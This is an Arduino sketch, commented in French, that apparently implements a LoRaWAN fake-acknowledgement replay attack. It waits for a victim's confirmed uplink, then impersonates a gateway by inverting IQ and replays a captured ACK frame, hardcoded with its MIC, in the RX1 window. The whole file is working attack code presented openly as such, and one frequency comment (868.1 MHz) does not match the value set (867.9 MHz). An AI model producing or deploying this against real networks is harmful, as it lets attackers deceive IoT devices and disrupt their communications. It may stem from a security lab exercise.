#include <SPI.h>
#include <LoRa.h>

// Trame extraite de votre log JSON (FCnt 14, ACK True, DevAddr 010c7b62)
// Cette trame contient le MIC valide nécessaire pour tromper la victime
byte capturedACK[] = {0x60, 0x62, 0x7B, 0x0C, 0x01, 0xAD, 0x0E, 0x00, 0x19, 0x92, 0xB5, 0xE8};

void setup() {
  Serial.begin(115200);
  
  // On commence par écouter sur la fréquence Uplink (868.3 MHz par défaut sur LoPy)
  if (!LoRa.begin(868300000)) { 
    Serial.println("Erreur : Module LoRa non détecté");
    while (1);
  }

  LoRa.setSpreadingFactor(7);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setSyncWord(0x34); // SyncWord LoRaWAN Public
  
  Serial.println("=== ATTAQUANT LORAWAN PRÊT ===");
  Serial.println("En attente d'un message CONFIRMED de la victime...");
}

void loop() {
  int packetSize = LoRa.parsePacket();
  
  if (packetSize) {
    byte mhdr = LoRa.read();
    
    // Vérifie si c'est un message "Confirmed Data Up" (0x80)
    if (mhdr == 0x80) {
      Serial.println("\n[!] Uplink Confirmed détecté !");
      Serial.println("[!] Préparation de l'injection du faux ACK...");

      // --- CRITIQUE : Timing et Paramètres de réception ---
      
      // 1. Attendre la fenêtre RX1 (exactement 1000ms après la fin de l'émission)
      delay(990); 

      // 2. Basculer sur la fréquence de réception (868.1 MHz selon votre log JSON)
      LoRa.setFrequency(867900000);
      
      // 3. Activer l'inversion de polarité IQ (obligatoire pour simuler une Gateway)
      LoRa.enableInvertIQ(); 

      // 4. Envoyer le paquet rejoué
      LoRa.beginPacket();
      LoRa.write(capturedACK, sizeof(capturedACK));
      LoRa.endPacket();

      Serial.println("[+] Faux ACK (FCnt 14) injecté dans RX1 !");
      
      // 5. Re-préparer pour la prochaine capture (Désactiver IQ et remettre fréquence Uplink)
      LoRa.disableInvertIQ();
      LoRa.setFrequency(868300000);
      Serial.println("Retour en mode écoute...");
    }
  }
}
